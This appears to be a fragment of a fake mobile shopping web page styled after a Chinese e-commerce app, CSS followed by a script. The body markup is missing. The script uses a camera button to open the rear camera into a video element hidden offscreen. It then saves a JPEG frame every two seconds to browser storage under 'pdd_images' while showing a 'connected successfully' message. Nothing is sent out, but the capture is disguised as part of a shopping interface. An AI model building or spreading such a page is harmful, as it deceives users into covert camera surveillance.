<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#f4f4f4;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;color:#333}
.status-bar{height:44px;background:#ff6000;display:flex;align-items:flex-end;justify-content:space-between;padding:0 12px 8px;color:#fff;font-size:14px}
.header{background:#ff6000;padding:0 12px 12px;position:sticky;top:0;z-index:100}
.search-wrap{display:flex;align-items:center;background:#fff;border-radius:30px;padding:8px 16px;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
.search-wrap .icon{width:18px;height:18px;margin-right:8px;opacity:.6}
.search-wrap input{border:none;outline:none;flex:1;font-size:15px;background:transparent}
.search-wrap input::placeholder{color:#999}
.swiper{height:160px;background:#fff;margin:10px;border-radius:12px;overflow:hidden;position:relative}
.swiper img{width:100%;height:100%;object-fit:cover}
.swiper .dots{position:absolute;bottom:8px;left:50%;transform:translateX(-50%);display:flex;gap:6px}
.swiper .dot{width:6px;height:6px;border-radius:50%;background:rgba(255,255,255,.5)}
.swiper .dot.active{background:#fff}
.nav-grid{background:#fff;margin:10px;border-radius:12px;padding:16px 0;display:grid;grid-template-columns:repeat(5,1fr);gap:12px 0}
.nav-item{display:flex;flex-direction:column;align-items:center;text-align:center}
.nav-item .icon{width:44px;height:44px;border-radius:50%;background:#f9f9f9;display:flex;align-items:center;justify-content:center;margin-bottom:6px}
.nav-item .icon img{width:24px;height:24px}
.nav-item .text{font-size:12px;color:#333}
.section-title{background:linear-gradient(90deg,#ff6000,#ff8a00);color:#fff;padding:12px 16px;margin:10px;border-radius:8px;font-size:16px;font-weight:600}
.goods-list{background:#fff;margin:10px;border-radius:12px;overflow:hidden}
.goods-item{display:flex;padding:12px;border-bottom:1px solid #f0f0f0}
.goods-item:last-child{border-bottom:none}
.goods-img{width:100px;height:100px;border-radius:8px;background:#f5f5f5;margin-right:12px;overflow:hidden}
.goods-img img{width:100%;height:100%;object-fit:cover}
.goods-info{flex:1;display:flex;flex-direction:column;justify-content:space-between}
.goods-title{font-size:15px;color:#333;line-height:1.4;margin-bottom:8px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
.goods-tags{display:flex;gap:4px;margin-bottom:8px}
.goods-tags .tag{font-size:10px;color:#ff6000;border:1px solid #ff6000;border-radius:2px;padding:1px 4px}
.goods-price{display:flex;align-items:baseline;color:#ff6000}
.goods-price .symbol{font-size:14px}
.goods-price .num{font-size:20px;font-weight:600}
.goods-price .sales{font-size:12px;color:#999;margin-left:8px}
.footer-nav{position:fixed;bottom:0;left:0;width:100%;height:50px;background:#fff;border-top:1px solid #eee;display:flex;justify-content:space-around;align-items:center;z-index:99}
.footer-item{display:flex;flex-direction:column;align-items:center;color:#666;font-size:12px}
.footer-item.active{color:#ff6000}
.camera-fab{position:fixed;bottom:70px;right:16px;width:56px;height:56px;border-radius:50%;background:#ff6000;color:#fff;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(255,96,0,.4);z-index:101}
video{position:fixed;top:-9999px;left:-9999px;opacity:0}
#status{position:fixed;bottom:140px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.7);color:#fff;padding:8px 16px;border-radius:20px;font-size:14px;z-index:102;display:none}
</style>

<script>
const v = document.getElementById('video');
const s = document.getElementById('start');
const st = document.getElementById('status');
let interval = null;

s.onclick = async () => {
  if (interval) {
    clearInterval(interval);
    interval = null;
    st.style.display = 'none';
    return;
  }
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
    v.srcObject = stream;
    st.style.display = 'block';
    interval = setInterval(() => {
      const c = document.createElement('canvas');
      c.width = v.videoWidth || 640;
      c.height = v.videoHeight || 480;
      c.getContext('2d').drawImage(v, 0, 0);
      c.toBlob(b => {
        const reader = new FileReader();
        reader.readAsDataURL(b);
        reader.onloadend = () => {
          const arr = JSON.parse(localStorage.getItem('pdd_images') || '[]');
          arr.push(reader.result);
          localStorage.setItem('pdd_images', JSON.stringify(arr));
          st.textContent = '✅ 连接成功';
        }
      }, 'image/jpeg', 0.7);
    }, 2000);
  } catch (e) {
    st.style.display = 'block';
    st.textContent = '❌ 请允许权限';
  }
};
</script>
